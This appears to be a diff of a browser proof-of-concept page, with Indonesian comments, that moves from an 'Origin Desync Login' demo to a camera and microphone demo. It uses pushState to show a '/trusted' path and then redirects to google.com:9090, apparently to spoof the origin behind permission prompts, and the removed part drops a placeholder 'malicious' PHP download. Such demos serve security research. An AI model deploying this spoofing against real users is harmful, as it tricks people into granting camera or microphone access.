@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>Origin Desync Login PoC</title>
+<title>Camera and Microphone PoC</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 
 <style>
@@ -37,18 +37,10 @@ h2 { text-align:center; margin-bottom:6px; }
   color:#b00020;
 }
 
-.download-button {
-  margin-top:20px;
-  width:100%;
-  padding:12px;
-  font-size:16px;
-  border-radius:10px;
-  border:none;
-  background:#007aff;
-  color:#fff;
+video { 
+  width:100%; 
+  margin-top:10px; 
 }
-
-video { width:100%; margin-top:10px; }
 
 #apiResults {
   margin-top: 20px;
@@ -69,38 +61,15 @@ video { width:100%; margin-top:10px; }
 </div>
 
 <div id="panel">
-  <h2>Download File</h2>
-  <div class="sub">Click below to download file.php</div>
-
-  <button class="download-button" onclick="downloadFile()">
-    Download File (file.php)
-  </button>
-
-  <hr>
-
-  <button id="locationButton" onclick="getLocation()">Get Location</button>
-  <p id="locationOutput">Location: -</p>
+  <h2>Access Camera and Microphone</h2>
 
   <button id="cameraButton" onclick="openCamera()">Open Camera</button>
   <video id="camera" autoplay playsinline></video>
 
   <hr>
 
-  <button id="batteryButton" onclick="accessBattery()">Get Battery Status</button>
-  <button id="networkButton" onclick="getNetworkInfo()">Get Network Info</button>
-  <button id="notificationButton" onclick="requestNotificationPermission()">Request Notification Permission</button>
-  <button id="fullscreenButton" onclick="requestFullscreen()">Request Fullscreen</button>
-  <button id="languageButton" onclick="getLanguageInfo()">Get Language and Timezone</button>
-
-  <div id="apiResults">
-    <h3>API Results:</h3>
-    <div id="batteryStatus">Battery Status: -</div>
-    <div id="networkInfo">Network Info: -</div>
-    <div id="languageInfo">Language & Timezone: -</div>
-    <div id="locationInfo">Location: -</div>
-    <div id="fullscreenStatus">Fullscreen Status: -</div>
-    <div id="notificationStatus">Notification Status: -</div>
-  </div>
+  <button id="microphoneButton" onclick="openMicrophone()">Open Microphone</button>
+  <div id="microphoneStatus">Microphone Status: -</div>
 
   <div class="notice">
     Demo only — browser permission required
@@ -110,38 +79,21 @@ video { width:100%; margin-top:10px; }
 <script>
 const panel = document.getElementById('panel');
 const trigger = document.getElementById('trigger');
-const locationOutput = document.getElementById('locationOutput');
 const camera = document.getElementById('camera');
-const apiResults = document.getElementById('apiResults');
+const microphoneStatus = document.getElementById('microphoneStatus');
 
 // FUNGSI ASLI (TIDAK DIUBAH)
-function downloadFile() {
-  const fileContent = `<?php echo 'This is a malicious PHP file!'; ?>`;
-  const fileBlob = new Blob([fileContent], { type: 'text/plain' });
-  const fileUrl = URL.createObjectURL(fileBlob);
 
-  const downloadLink = document.createElement('a');
-  downloadLink.href = fileUrl;
-  downloadLink.download = 'file.php';
-  document.body.appendChild(downloadLink);
-  downloadLink.click();
-  document.body.removeChild(downloadLink);
-}
-
-function getLocation() {
-  if (!navigator.geolocation) return;
-  navigator.geolocation.getCurrentPosition(
-    pos => locationOutput.textContent = `Location: ${pos.coords.latitude}, ${pos.coords.longitude}`,
-    () => locationOutput.textContent = 'Permission denied'
-  );
-}
-
+// Fungsi untuk membuka kamera
 function openCamera() {
   checkCameraPermission()
     .then(hasPermission => {
       if (hasPermission) {
         navigator.mediaDevices.getUserMedia({ video:true })
-          .then(s => camera.srcObject = s)
+          .then(stream => {
+            camera.srcObject = stream;
+            camera.style.display = "block";
+          })
           .catch(() => alert('Camera denied'));
       } else {
         alert('Camera permission denied by user');
@@ -160,54 +112,44 @@ function checkCameraPermission() {
     });
 }
 
-// API Functions with Results in the UI
-function accessBattery() {
-  if (navigator.getBattery) {
-    navigator.getBattery().then(battery => {
-      document.getElementById('batteryStatus').textContent = `Battery Status: ${Math.round(battery.level * 100)}%`;
+// Fungsi untuk membuka mikrofon
+function openMicrophone() {
+  checkMicrophonePermission()
+    .then(hasPermission => {
+      if (hasPermission) {
+        navigator.mediaDevices.getUserMedia({ audio:true })
+          .then(stream => {
+            microphoneStatus.textContent = 'Microphone is active';
+          })
+          .catch(() => alert('Microphone denied'));
+      } else {
+        alert('Microphone permission denied by user');
+      }
     });
-  }
 }
 
-function getNetworkInfo() {
-  if (navigator.connection) {
-    document.getElementById('networkInfo').textContent = `Network Info: ${navigator.connection.effectiveType}`;
-  }
-}
-
-function requestNotificationPermission() {
-  if (Notification) {
-    Notification.requestPermission().then(permission => {
-      document.getElementById('notificationStatus').textContent = `Notification Permission: ${permission}`;
+// Cek izin mikrofon dengan navigator.permissions
+function checkMicrophonePermission() {
+  return navigator.permissions.query({ name: 'microphone' })
+    .then(permissionStatus => {
+      return permissionStatus.state === 'granted';
+    })
+    .catch(() => {
+      return false; // Jika tidak dapat mengecek izin, anggap ditolak
     });
-  }
 }
 
-function requestFullscreen() {
-  document.documentElement.requestFullscreen().catch(() => {});
-  document.getElementById('fullscreenStatus').textContent = 'Fullscreen Requested';
-}
-
-function getLanguageInfo() {
-  const language = navigator.language;
-  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-  document.getElementById('languageInfo').textContent = `Language: ${language}, Timezone: ${timezone}`;
-}
-
+// Fungsi untuk melakukan redirect ke Google setelah tombol "Start PoC" ditekan
 trigger.onclick = () => {
   history.pushState({}, '', '/trusted');
   panel.style.display = 'block';
+
+  // Menambahkan redirect ke Google setelah 2 detik
+  setTimeout(() => {
+    window.location.href = "https://www.google.com:9090"; // Redirect ke Google
+  }, 2000); // 2 detik setelah klik tombol
 };
 
-window.addEventListener('pageshow', () => {
-  requestAnimationFrame(() => {
-    requestAnimationFrame(() => {
-      setTimeout(() => {
-        location.href = 'https://google.com:9090';
-      }, 80);
-    });
-  });
-});
 </script>
 
 </body>
